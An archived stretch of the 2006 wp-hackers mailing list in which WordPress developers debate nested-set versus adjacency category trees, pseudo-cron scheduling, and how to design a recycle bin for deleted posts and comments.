Message-ID: <a491f91d0602110903v100c1cafg1dccfca13973f715@mail.gmail.com>

On 2/11/06, Denis de Bernardy <denis@semiologic.com> wrote:
> sql tree preordering works nice, but imho implementing them without
> transactions and triggers is really asking for trouble.
>

Another perfect reason for dropping everything < 4.1 (As I mentioned
in the other thread about ideas for 2.next. At least with 4.1, we'd
have transactions, maybe not stored procedures or triggers, but
transactions at the very least.

--
--Robert Deaton
http://somethingunpredictable.com
From denis at semiologic.com  Sat Feb 11 17:03:55 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sat Feb 11 17:05:34 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <BAY106-DAV91469B553550C9EC4A32F9E050@phx.gbl>
Message-ID: <000d01c62f2d$24c7de70$6802a8c0@kergan>

> > sql tree preordering works nice, but imho implementing them without 
> > transactions and triggers is really asking for trouble.
> 
> I suppose performing an index check after every insert/update 
> might be a bit excessive .. or would it?

Technically, you can live with a corrupt tree, but you cannot trust any math
to make assumptions on its contents.

Assume the following if this is not immediate to you:

UPDATE tree SET rgt=rgt+2 WHERE rgt>5;
UPDATE tree SET lft=lft+2 WHERE lft>5;
INSERT INTO tree (lft, rgt, title) values (6, 7, 'Strawberry');

Now, imagine a user who is a little nervous with the save button and a
server than terminates php scripts without executing them until the end on
multi-clicks.

UPDATE tree SET rgt=rgt+2 WHERE rgt>5;
UPDATE tree SET lft=lft+2 WHERE lft>5;
-- user clicks the save button again

UPDATE tree SET rgt=rgt+2 WHERE rgt>5;
-- one more time

UPDATE tree SET rgt=rgt+2 WHERE rgt>5;
UPDATE tree SET lft=lft+2 WHERE lft>5;
INSERT INTO tree (lft, rgt, title) values (6, 7, 'Strawberry');

note that the sql tree remains useful when you traverse the data. when it
comes to the underlying math, however:

descendants != (right - left - 1) / 2

D.

From davebytes at comcast.net  Sat Feb 11 17:31:49 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb 11 17:33:23 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
References: <000d01c62f2d$24c7de70$6802a8c0@kergan>
Message-ID: <004d01c62f31$0a3c8840$6e01a8c0@sixfour>

Well, without some real atomic operation, uncancellable by the user, lots of 
problems could occur throughout the entire system... ;)

Some ideas for this one:
- spawn the thing that does the update in another script, so user can't muck 
it up.
- have the update script use some kind of lock file, in order to try to keep 
atomicity of its operations.
..etc.

Just me, randomly writing without thinking... :)
-d

----- Original Message ----- 
From: "Denis de Bernardy" <denis@semiologic.com>
To: <wp-hackers@lists.automattic.com>
Sent: Saturday, February 11, 2006 12:03 PM
Subject: RE: [wp-hackers] Category Operation (Adjacency vs. Modified 
Preorder)


> > sql tree preordering works nice, but imho implementing them without
> > transactions and triggers is really asking for trouble.
>
> I suppose performing an index check after every insert/update
> might be a bit excessive .. or would it?

Technically, you can live with a corrupt tree, but you cannot trust any math
to make assumptions on its contents.

From wp at ebroder.net  Sat Feb 11 17:54:30 2006
From: wp at ebroder.net (Evan Broder)
Date: Sat Feb 11 17:56:42 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <004d01c62f31$0a3c8840$6e01a8c0@sixfour>
References: <000d01c62f2d$24c7de70$6802a8c0@kergan>
	<004d01c62f31$0a3c8840$6e01a8c0@sixfour>
Message-ID: <43EE24D6.600@ebroder.net>

I'm not sure that I see the sense in using modified preorder for WP 
categories.

It seems that the only thing we gain is the ability to count the number 
of children any given node has. However, it becomes significantly more 
difficult to loop through, say, the top level categories.

It's quite probable that I just haven't completely wrapped by head 
around the modified preorder, but it seems like it causes more problems 
that it solves. For example, there's the whole easy corruptibility, but 
it also complicates any attempts to change the order categories are 
sorted in and stuff like that.

Like I said, I probably just still miss the inner beauty of the modified 
preorder, but it seems like we'd be better off sticking to the adjacent 
method.

- Evan
From agent_eight at hotmail.com  Sat Feb 11 18:15:33 2006
From: agent_eight at hotmail.com (Chris Johnson)
Date: Sat Feb 11 18:16:45 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
References: <000d01c62f2d$24c7de70$6802a8c0@kergan><004d01c62f31$0a3c8840$6e01a8c0@sixfour>
	<43EE24D6.600@ebroder.net>
Message-ID: <BAY106-DAV209AF9F53E9309C11569DA9E050@phx.gbl>

> I'm not sure that I see the sense in using modified preorder for WP 
> categories.
> It seems that the only thing we gain is the ability to count the number of 
> children any given node has.

The real draw that I see is the ability to create easily readable subtrees. 
You'ld have a dummy root node at the top of the tree and then a handful of 
subtrees as children. One for youre main blog entries, one for an aside, 
etc. You could include or exclude whole trees with single queries.

> However, it becomes significantly more
> difficult to loop through, say, the top level categories.

That's where the addition of a "level" field comes in. If your dummy root 
node is at level 0, just query all the children of root with level = 1. I 
think that's what you were looking for

I do admit this is a feature that does really need transactions to be safely 
viable. 
From ryan at boren.nu  Sat Feb 11 18:40:02 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Feb 11 18:41:51 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43ECF202.2040200@boren.nu>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>	<43EC4C15.5070904@jrm.cc>	<43EC4E7E.1010208@boren.nu>	<43ECBC7F.3050005@midnightcircus.com>
	<43ECF202.2040200@boren.nu>
Message-ID: <43EE2F82.4090204@boren.nu>

future status:
http://trac.wordpress.org/ticket/2426

Pseudo-cron
http://trac.wordpress.org/ticket/2425

I already committed the first cut at pseudo-cron for #2425.  #2426 has 
an in-the-works patch for post_status = future.

Ryan
From m at mullenweg.com  Sat Feb 11 20:47:32 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat Feb 11 20:49:52 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <43EC8C04.9020401@midnightcircus.com>
References: <20060209231114.32274638F@comox.textdrive.com>	<43EC76B4.4000500@viper007bond.com>
	<43EC8C04.9020401@midnightcircus.com>
Message-ID: <43EE4D64.80603@mullenweg.com>

Owen Winkler wrote:
> Is there someplace we can use to regularly drop these attachments, since 
> we seem to be losing a lot of them?

Like attachments on Trac?

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Sat Feb 11 21:17:25 2006
From: podz at tamba2.org.uk (Podz)
Date: Sat Feb 11 21:18:34 2006
Subject: [wp-hackers] Data recovery
Message-ID: <43EE5465.1090502@tamba2.org.uk>

Right now, if you delete a post or a comment then it really is deleted.
Unrecoverable.
Shouldn't either:
- the warning be beefed up a bit, or
- the data be made recoverable ?

Users are used to a recycle bin, and gearing WP toward multiple users it
would seem a decent option to be able to recover anything deleted within
a timescale set by the blog owner.
As usual I haven't the slightest clue how to do it, but I would imagine
such a feature would be well received.

P.
From dmhouse at gmail.com  Sat Feb 11 21:37:26 2006
From: dmhouse at gmail.com (David House)
Date: Sat Feb 11 21:39:04 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <43EE5465.1090502@tamba2.org.uk>
References: <43EE5465.1090502@tamba2.org.uk>
Message-ID: <ebe43d680602111337l1c8f285aw@mail.gmail.com>

On 11/02/06, Podz <podz@tamba2.org.uk> wrote:
> Users are used to a recycle bin, and gearing WP toward multiple users it
> would seem a decent option to be able to recover anything deleted within
> a timescale set by the blog owner.
> As usual I haven't the slightest clue how to do it, but I would imagine
> such a feature would be well received.

Another use for an integrated cron. Once a week/month, we could just
garbage-collect on a wp-trash table.

It's worth pointing out MT already has this feature.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From kimmo+key+wordpress.c4f53f at suominen.com  Sat Feb 11 21:44:45 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Sat Feb 11 21:46:30 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <ebe43d680602111337l1c8f285aw@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
Message-ID: <20060211214445.GK1070@kimmo.suominen.com>

On Sat, Feb 11, 2006 at 09:37:26PM +0000, David House wrote:
> On 11/02/06, Podz <podz@tamba2.org.uk> wrote:
> > Users are used to a recycle bin, and gearing WP toward multiple users it
> > would seem a decent option to be able to recover anything deleted within
> > a timescale set by the blog owner.
> > As usual I haven't the slightest clue how to do it, but I would imagine
> > such a feature would be well received.
> 
> Another use for an integrated cron. Once a week/month, we could just
> garbage-collect on a wp-trash table.

Rather than copy data around in the database, using flag fields would
be more efficient.  Also makes it possible to recover to the same ID,
since the data never leaves the table until garbage collect time.

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From davebytes at comcast.net  Sat Feb 11 22:07:46 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb 11 22:09:21 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
Message-ID: <007501c62f57$9754b8d0$6e01a8c0@sixfour>

Agreed.  And, with the move to make more things varchar for extensibility, 
here's a vote to move post_status away from being an enum. 
post_status=='trash' would probably do fine for this.  or ".trash" (would be 
nice to have a convention for hiding certain status 'classes' from the 
normal view queries without explicitly listing the states to exclude...).

Thoughts?  (esp Ryan?  given the recent status=='future' changes...)

While we're at it, how about making the comment_approved a varchar too... ;) 
;)

-d

----- Original Message ----- 
From: "Kimmo Suominen" <kimmo+key+wordpress.c4f53f@suominen.com>
To: <wp-hackers@lists.automattic.com>
Sent: Saturday, February 11, 2006 4:44 PM
Subject: Re: [wp-hackers] Data recovery


| On Sat, Feb 11, 2006 at 09:37:26PM +0000, David House wrote:
| > On 11/02/06, Podz <podz@tamba2.org.uk> wrote:
| > > Users are used to a recycle bin, and gearing WP toward multiple users 
it
| > > would seem a decent option to be able to recover anything deleted 
within
| > > a timescale set by the blog owner.
| > > As usual I haven't the slightest clue how to do it, but I would 
imagine
| > > such a feature would be well received.
| >
| > Another use for an integrated cron. Once a week/month, we could just
| > garbage-collect on a wp-trash table.
|
| Rather than copy data around in the database, using flag fields would
| be more efficient.  Also makes it possible to recover to the same ID,
| since the data never leaves the table until garbage collect time.

From mark.wordpress at txfx.net  Sat Feb 11 22:13:03 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 11 22:14:43 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <007501c62f57$9754b8d0$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
Message-ID: <C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>

On Feb 11, 2006, at 5:07 PM, David Chait wrote:

> Agreed.  And, with the move to make more things varchar for  
> extensibility,
> here's a vote to move post_status away from being an enum.
> post_status=='trash' would probably do fine for this.  or  
> ".trash" (would be
> nice to have a convention for hiding certain status 'classes' from the
> normal view queries without explicitly listing the states to  
> exclude...).

+1 on all counts, including making comment_approved a varchar.  Note  
(important one!): we're going to have to sweep through the code and  
make sure that all WP comparisons on post_status or comment_approved  
do == comparisons and not != comparisons.  That is, you should be  
able to add a new status and have WP just ignore it.  WordPress  
should name the statuses it wants to be seeing, not the ones it  
doesn't, because that might accidentally include new "custom" statuses.
--
Mark Jaquith
http://txfx.net/


From davebytes at comcast.net  Sat Feb 11 23:08:10 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb 11 23:09:51 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
Message-ID: <000801c62f60$071fd390$6e01a8c0@sixfour>

right, or have something like a dot-prefix to denote hidden classes of 
objects that the normal interface should ignore...

yes, definitely will need a code sweep.

-d

----- Original Message ----- 
From: "Mark Jaquith" <mark.wordpress@txfx.net>
To: <wp-hackers@lists.automattic.com>
Sent: Saturday, February 11, 2006 5:13 PM
Subject: Re: [wp-hackers] Data recovery (post_status?)


| On Feb 11, 2006, at 5:07 PM, David Chait wrote:
|
| > Agreed.  And, with the move to make more things varchar for
| > extensibility,
| > here's a vote to move post_status away from being an enum.
| > post_status=='trash' would probably do fine for this.  or
| > ".trash" (would be
| > nice to have a convention for hiding certain status 'classes' from the
| > normal view queries without explicitly listing the states to
| > exclude...).
|
| +1 on all counts, including making comment_approved a varchar.  Note
| (important one!): we're going to have to sweep through the code and
| make sure that all WP comparisons on post_status or comment_approved
| do == comparisons and not != comparisons.  That is, you should be
| able to add a new status and have WP just ignore it.  WordPress
| should name the statuses it wants to be seeing, not the ones it
| doesn't, because that might accidentally include new "custom" statuses. 

From ryan at boren.nu  Sun Feb 12 05:12:26 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sun Feb 12 05:14:07 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<C0A15693-5CAE-4EE7-8C3C-80122CDEAD52@txfx.net>
Message-ID: <43EEC3BA.1050507@boren.nu>

Mark Jaquith wrote:
> On Feb 11, 2006, at 5:07 PM, David Chait wrote:
> 
>> Agreed.  And, with the move to make more things varchar for  
>> extensibility,
>> here's a vote to move post_status away from being an enum.
>> post_status=='trash' would probably do fine for this.  or  ".trash" 
>> (would be
>> nice to have a convention for hiding certain status 'classes' from the
>> normal view queries without explicitly listing the states to  
>> exclude...).
> 
> 
> +1 on all counts, including making comment_approved a varchar.  Note  
> (important one!): we're going to have to sweep through the code and  
> make sure that all WP comparisons on post_status or comment_approved  do 
> == comparisons and not != comparisons.  That is, you should be  able to 
> add a new status and have WP just ignore it.  WordPress  should name the 
> statuses it wants to be seeing, not the ones it  doesn't, because that 
> might accidentally include new "custom" statuses.

All post_status != comparisons should be gone soon.  I still need to get 
rid of the != 'draft' comparison in execute-pings.php.  That one could 
be = 'publish' instead.

Ryan

From r at schestowitz.com  Sun Feb 12 05:51:50 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Sun Feb 12 05:50:14 2006
Subject: [wp-hackers] Data recovery
In-Reply-To: <43EE5465.1090502@tamba2.org.uk>
References: <43EE5465.1090502@tamba2.org.uk>
Message-ID: <20060212055150.echb5igha7v5wcg8@banana.catalyst2.com>

_____/ On Sat 11 Feb 2006 21:17:25 GMT, [Podz] wrote : \_____

> Right now, if you delete a post or a comment then it really is deleted.
> Unrecoverable.
> Shouldn't either:
> - the warning be beefed up a bit, or
> - the data be made recoverable ?
>
> Users are used to a recycle bin, and gearing WP toward multiple users it
> would seem a decent option to be able to recover anything deleted within
> a timescale set by the blog owner.
> As usual I haven't the slightest clue how to do it, but I would imagine
> such a feature would be well received.

The idea of garbage collection has been raised already (set status to
"deleted", later purge). It's reminiscent of IMAP handling in most mail
clients.

That said, a few days ago I realised something else was missing. In "Mass
Edit Mode" (comments moderation), there is no indication as to how many
comments get purged until they disappear for good, i.e. deletion is
conformed. I suppose you could trivially percolate the number of marked
items to the JavaScript prompt. That way, the user can double-check the
number of comments to be deleted. This behaviour has not changed since 1.2
(at the least). I still see it in the latest nightly.

With kind regards,

Roy

From dmhouse at gmail.com  Sun Feb 12 10:11:32 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb 12 10:13:11 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <007501c62f57$9754b8d0$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
Message-ID: <ebe43d680602120211g681b3a23t@mail.gmail.com>

On 11/02/06, David Chait <davebytes@comcast.net> wrote:
> Agreed.  And, with the move to make more things varchar for extensibility,
> here's a vote to move post_status away from being an enum.
> post_status=='trash' would probably do fine for this.  or ".trash" (would be
> nice to have a convention for hiding certain status 'classes' from the
> normal view queries without explicitly listing the states to exclude...).

Problems here:

* We lose all indication of what the post/comment/user etc was before.
If you delete a draft then restore it it should restore to a draft,
similarily with posts
* post_status only covers posts, we'd need an analoguous column in
wp_comments and wp_users if we were to push ahead.

Personally, I'm a fan of prepending some character that doens't
normally appear in slugs, like a period.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mark.wordpress at txfx.net  Sun Feb 12 10:18:59 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sun Feb 12 10:20:42 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <ebe43d680602120211g681b3a23t@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
Message-ID: <F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>

On Feb 12, 2006, at 5:11 AM, David House wrote:

> * We lose all indication of what the post/comment/user etc was before.
> If you delete a draft then restore it it should restore to a draft,
> similarily with posts

Could use postmeta to store the old value.

> Personally, I'm a fan of prepending some character that doens't
> normally appear in slugs, like a period.

You mean, like going from `post_status` = 'draft' to `post_status` =  
'.draft' ?  That way you could imply "trash" and "where was it  
originally" in one go.

--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Sun Feb 12 12:26:21 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb 12 12:28:01 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
Message-ID: <ebe43d680602120426u20523b8m@mail.gmail.com>

On 12/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> Could use postmeta to store the old value.

We could indeed. +1.

> You mean, like going from `post_status` = 'draft' to `post_status` =
> '.draft' ?  That way you could imply "trash" and "where was it
> originally" in one go.

I was thinking we prepend it to the slug, actually.

Anyway, we need to decide whether to use post_status (in which case
we'd need a comment_status, user_status, link_status, etc. for
everywhere else you want this recycle bin to happen) or whether to
prepend something like a period to the respective objects' slugs.
(Note that we currently don't allow periods in slugs so there's no
danger of breakage)

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From skippy at skippy.net  Sun Feb 12 13:34:52 2006
From: skippy at skippy.net (Scott Merrill)
Date: Sun Feb 12 13:36:36 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <ebe43d680602120426u20523b8m@mail.gmail.com>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
Message-ID: <43EF397C.2040600@skippy.net>

David House wrote:
> Anyway, we need to decide whether to use post_status (in which case
> we'd need a comment_status, user_status, link_status, etc. for
> everywhere else you want this recycle bin to happen) or whether to
> prepend something like a period to the respective objects' slugs.

Do we need  a "recycle bin" for _all_ aspects of the site?  That'll get
kind of annoying.  When I delete something, I do so because I want it to
be gone.  A two step delete process (delete, then purge) will become
cumbersome.

Has anyone asked on the forums whether this is a desirable thing?  I
understand the benefit of recovering posts, and possibly even recovering
users.  Beyond that, though, can't someone write up a fancy plugin to
read in a SQL dump created by wp-db-backup.php and provide a list of
what's different between the dump and the current system, with some
facility to reconcile the current system with the backup?

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From sam at rephrase.net  Sun Feb 12 14:54:11 2006
From: sam at rephrase.net (Sam Angove)
Date: Sun Feb 12 14:55:51 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <43EF397C.2040600@skippy.net>
References: <43EE5465.1090502@tamba2.org.uk>
	<ebe43d680602111337l1c8f285aw@mail.gmail.com>
	<20060211214445.GK1070@kimmo.suominen.com>
	<007501c62f57$9754b8d0$6e01a8c0@sixfour>
	<ebe43d680602120211g681b3a23t@mail.gmail.com>
	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<43EF397C.2040600@skippy.net>
Message-ID: <aa74b1910602120654m24c59d94p236e19f4b6803fbf@mail.gmail.com>

On 2/13/06, Scott Merrill <skippy@skippy.net> wrote:
>
> When I delete something, I do so because I want it to
> be gone.  A two step delete process (delete, then purge) will become
> cumbersome.

How often do you ever need it to be instantly, irrevocably gone? A
recycle bin hooked to daily/weekly/monthly wp-cron would be no
hardship at all.

There was a story recently about a high-profile blogger (Scott Adams?)
who accidentally deleted a ton of comments over some misunderstanding
of how the software worked. He'd have liked a recycle bin.

Honestly, I think it'd be used far more for comments than posts (I
regularly read of comment-deletion accidents), so extending it to
other types is a good idea.

David House wrote:
> Anyway, we need to decide whether to use post_status (in which case
> we'd need a comment_status, user_status, link_status, etc. for
> everywhere else you want this recycle bin to happen) or whether to
> prepend something like a period to the respective objects' slugs.

How are you going to query a period-prepended post slug? Better to use
post_status.

Published posts could be safely reverted to drafts if restored:
there's a pretty strong chance they're going to want to edit it.

That said, might as well keep the status in a separate trashed items
table -- something like `trash_id`, `item_type`, `item_status`,
`item_id`, `purge_when`.

A separate table is needed anyway, since individual "date
trashed"/"purge at this time" timestamps are needed if automatic
purging can happen in an intelligent way. And it's a lot cleaner than
querying 5 separate tables for trashed objects.
From davebytes at comcast.net  Sun Feb 12 15:40:47 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 15:42:24 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>
	<43EF397C.2040600@skippy.net>
Message-ID: <001301c62fea$b1ef71b0$6e01a8c0@sixfour>

Why not?  It helps the non-technical users a ton, it makes accidents quickly 
recoverable, and you could have a single 'recycle bin' page that shows all 
the different deleted items and purges them all with one click.

There's a trash can on the desktop for a reason.  Not just because it makes 
drag-and-drop actions possible, but also because it adds a step before you 
nuke something.  (And, even then, you've got Undelete tools, which cache it 
one level further hidden, just in case you really didn't mean to purge the 
things you did!)

If really needed, you could have an options page that allows you to disable 
the recycle bin for each class of objects... but I'm not sure how useful 
that is.  One more click, or X days later, everything does disappear...

FYI, I don't believe the forums are really a useful place for asking 
questions of users...  It is extremely fragmented (okay, unless you sticky a 
post on the homepage), and I'm sure not everyone makes it there.  And 
Wordpress.com, et al, users probably don't visit much as they are told to go 
elsewhere -- yet that's a growing base of 'usability testing' given it's 
limits.

-d

----- Original Message ----- 
From: "Scott Merrill" <skippy@skippy.net>
To: <wp-hackers@lists.automattic.com>
Sent: Sunday, February 12, 2006 8:34 AM
Subject: Re: [wp-hackers] Data recovery (post_status?)


| David House wrote:
| > Anyway, we need to decide whether to use post_status (in which case
| > we'd need a comment_status, user_status, link_status, etc. for
| > everywhere else you want this recycle bin to happen) or whether to
| > prepend something like a period to the respective objects' slugs.
|
| Do we need  a "recycle bin" for _all_ aspects of the site?  That'll get
| kind of annoying.  When I delete something, I do so because I want it to
| be gone.  A two step delete process (delete, then purge) will become
| cumbersome.
|
| Has anyone asked on the forums whether this is a desirable thing?  I
| understand the benefit of recovering posts, and possibly even recovering
| users.  Beyond that, though, can't someone write up a fancy plugin to
| read in a SQL dump created by wp-db-backup.php and provide a list of
| what's different between the dump and the current system, with some
| facility to reconcile the current system with the backup? 

From davebytes at comcast.net  Sun Feb 12 15:44:49 2006
From: davebytes at comcast.net (David Chait)
Date: Sun Feb 12 15:46:27 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
Message-ID: <001801c62feb$42812de0$6e01a8c0@sixfour>

I'm happy with any solution that is reasonably quick to query, and takes 
minimal-if-any resources to exclude from queries.  If you have to query a 
secondary table, or test a character, that'll make it more difficult to 
'exclude'.  That's why I proposed post-status==trash, though I admittedly 
didn't consider the 'how to put things back' for posts vs comments vs ...  I 
think the period-prefix thing is a potential query bottleneck...

do we simply need a 'trash' flag on all major object tables?  that just 
seems overkill in one sense, in another it simplifies stuff greatly.

-d

----- Original Message ----- 
From: "David House" <dmhouse@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Sunday, February 12, 2006 7:26 AM
Subject: Re: [wp-hackers] Data recovery (post_status?)


On 12/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> Could use postmeta to store the old value.

We could indeed. +1.

> You mean, like going from `post_status` = 'draft' to `post_status` =
> '.draft' ?  That way you could imply "trash" and "where was it
> originally" in one go.

I was thinking we prepend it to the slug, actually.

Anyway, we need to decide whether to use post_status (in which case
we'd need a comment_status, user_status, link_status, etc. for
everywhere else you want this recycle bin to happen) or whether to
prepend something like a period to the respective objects' slugs.
(Note that we currently don't allow periods in slugs so there's no
danger of breakage)

From kimmo+key+wordpress.c4f53f at suominen.com  Sun Feb 12 15:59:13 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Sun Feb 12 16:01:00 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <001801c62feb$42812de0$6e01a8c0@sixfour>
References: <ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
Message-ID: <20060212155913.GN1070@kimmo.suominen.com>

On Sun, Feb 12, 2006 at 10:44:49AM -0500, David Chait wrote:
> do we simply need a 'trash' flag on all major object tables?  that just 
> seems overkill in one sense, in another it simplifies stuff greatly.

I would vote for having a trash flag in all tables that will support
the "trash can" idea.  I think it would simplify life in the long run,
as you don't have to recall different column names and different magic
values for them.

Personally I'd only want a trash can for posts and comments.  (I'm not
against having it for "everything," though.)

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From ringmaster at midnightcircus.com  Sun Feb 12 16:11:09 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Feb 12 16:13:07 2006
Subject: [wp-hackers] Data recovery (post_status?)
In-Reply-To: <001801c62feb$42812de0$6e01a8c0@sixfour>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net>
	<ebe43d680602120426u20523b8m@mail.gmail.com>
	<001801c62feb$42812de0$6e01a8c0@sixfour>
Message-ID: <43EF5E1D.6030505@midnightcircus.com>

David Chait wrote:
> I'm happy with any solution that is reasonably quick to query, and takes 
> minimal-if-any resources to exclude from queries.  If you have to query a 
> secondary table, or test a character, that'll make it more difficult to 
> 'exclude'.  That's why I proposed post-status==trash, though I admittedly 
> didn't consider the 'how to put things back' for posts vs comments vs ...  I 
> think the period-prefix thing is a potential query bottleneck...
> 
> do we simply need a 'trash' flag on all major object tables?  that just 
> seems overkill in one sense, in another it simplifies stuff greatly.

When did "delete" come to mean "possibly store it somewhere for 
convenient for later retrieval, just in case you didn't really want to 
actually, you know, delete it"?  I never saw any delete buttons labeled 
"Throw this away, but put it somewhere I can get it later if I made a 
mistake".  I can see the advantage of letting users recover from their 
mistakes, but geez.

In any case, using a separate trash table to hold all of this data seems 
silly when the affected tables have a status column that could be set to 
"deleted".  The only thing you lose is the status prior to deletion, 
which would be set to the status with the least impact, for example, 
"draft" or "0"/"moderate".  Everything else would already be set properly.

Deletion dates (if you want to purge deleted things via cron) could be 
stored in postmeta.  For comments, that's a bit trickier.  Are we going 
to add the commentmeta table?  If so, there's the natural place for it. 
  If not, then the purge cron action can simply store (in options) the 
comment ids of all of the comments that it didn't purge during the last 
purge event.  It will only purge comments that are stored in this list.

